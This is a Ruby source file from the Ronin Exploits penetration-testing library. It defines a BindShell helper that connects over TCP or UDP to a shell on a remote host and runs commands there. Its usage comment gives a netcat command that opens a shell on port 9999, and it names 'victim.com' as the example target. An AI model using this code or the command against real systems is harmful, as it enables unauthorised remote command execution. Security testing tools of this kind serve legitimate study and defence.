#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2011 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/payloads/helpers/shell'
require 'ronin/extensions/string'

require 'socket'

module Ronin
  module Payloads
    module Helpers
      #
      # A {Payload} helper for communicating with TCP/UDP bind-shells.
      #
      # ## Example
      #
      #     ronin_payload do
      #
      #       helper :bind_shell
      #
      #       cache do
      #         # ...
      #       end
      #
      #     end
      #
      # ## Usage
      # 
      # On the remote host start the bind-shell. The easiest way is using
      # the `netcat` utility; assuming you can execute commands.
      #
      #     $ nc -l 9999 -e /bin/sh
      #
      # Configure the payload:
      # 
      #     payload.host = 'victim.com'
      #     payload.port = 9999
      #
      # Then access the bind-shell.
      #
      #     payload.shell.ls
      #     # => "Documents  Music\t   Public  Templates\nDesktop
      #     Downloads  Pictures  src\t   Videos\n"
      #
      module BindShell
        include Shell

        def self.extended(base)
          base.instance_eval do
            leverage :shell
            leverage :fs

            # The host the bind-shell is running on
            parameter :host, :type => String,
                             :description => 'Host to connect to'

            # The port the bind-shell is listening on
            parameter :port, :type => Integer,
                             :description => 'Port to connect to'

            # The protocol to use (tcp/udp)
            parameter :protocol, :default => :tcp,
                                 :description => 'Protocol to connect with'

            test_set :host
            test_set :port
            test_in :protocol, [:tcp, :udp]

            deploy do
              socket = case self.protocol
                       when :tcp
                         TCPSocket
                       when :udp
                         UDPSocket
                       end

              @bind_shell = socket.new(self.host,self.port)
            end

            evacuate do
              @bind_shell.close if (@bind_shell && !(@bind_shell.closed?))
              @bind_shell = nil
            end
          end
        end

        #
        # Send a command to the bind-shell and process the output.
        #
        # @param [String] program
        #   The program to run remotely.
        #
        # @param [Array<String>] program
        #   Additional arguments for the program.
        #
        # @yield [line]
        #   Each line of output received from the bind-shell will be
        #   yielded.
        #
        # @yieldparam [String] line
        #   A line of output from the shell.
        #
        # @since 1.0.0
        #
        def shell_exec(program,*arguments)
          command = ([program] + arguments).join(' ')
          
          # generate a random id for the command
          id = (rand(1_000_000) + 10_000_000).to_s
          header = "#{self.host}:#{self.port} [#{id}]"
          output_entered = false

          print_debug "#{header} Sending command: #{command}"

          # send the command
          @bind_shell.puts("echo #{id}; #{command}; echo #{id}")

          @bind_shell.each_line do |line|
            if line.chomp == id
              if output_entered
                # leaving command output
                break
              else
                # command output has been entered
                output_entered = true
              end
            elsif output_entered
              print_debug "#{header}   #{line.dump}"
              yield line
            end
          end

          print_debug "#{header} Command finished."
        end

        #
        # Writes data to the bind shell.
        #
        # @param [String] data
        #   The data to write.
        #
        # @return [Integer]
        #   The number of bytes writen.
        #
        # @since 1.0.0
        #
        def shell_write(data)
          @bind_shell.write(data)
        end
      end
    end
  end
end
